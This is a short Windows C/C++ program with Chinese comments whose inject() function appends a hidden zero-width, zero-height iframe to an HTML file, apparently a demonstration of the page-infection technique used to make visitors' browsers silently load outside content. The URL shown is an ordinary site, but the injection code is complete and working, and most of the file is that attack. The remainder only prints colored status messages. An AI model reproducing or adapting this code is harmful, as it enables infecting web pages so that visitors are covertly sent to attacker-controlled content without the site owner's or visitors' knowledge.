#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
bool inject(char *filepath)
{
	char url[]="\r\n<iframe src=http://www.baidu.com/ width=0 height=0></iframe>";
	FILE *fp;
	fp=fopen(filepath,"rb+");
	if(fp==NULL)
	{
		return false;
	}
	fseek(fp,0,SEEK_END);
	fwrite(url,sizeof(char),strlen(url),fp);
	fclose(fp);
	return true;
}
void setColor(unsigned short ForeColor=3,unsigned short BackGroundColor=0) 
//给参数默认值
{ 
	HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE); //
	SetConsoleTextAttribute(hCon,ForeColor|BackGroundColor); 	
}
void OutPutDebugInfo(char *s,int level=0)
{
	switch (level)
	{
	case 0:
		setColor(7,0);//白色
		printf("%s",s);
		break;
	case 1:
		setColor(FOREGROUND_GREEN,0);;//绿色
		printf("%s",s);
		break;
	case 2:
		setColor(6,0);//黄色
		printf("%s",s);
		break;
	case 3:
		setColor(FOREGROUND_RED,0);//红色
		printf("%s",s);
		break;
	default:
		setColor(7,0);//白色
		printf("%s",s);
		break;
 
	}
}
int main(int argc, char* argv[]) 
{ 	
	if(!inject("c:\\test.htm")) 		
	{ 		
		OutPutDebugInfo("Inject Error\n",3); 
		
	}else 		
	{ 		
		OutPutDebugInfo("Inject success\n"); 		
	} 	
	//OutPutDebugInfo("Inject success\n");
	getchar();
	return 0; 
	
} 
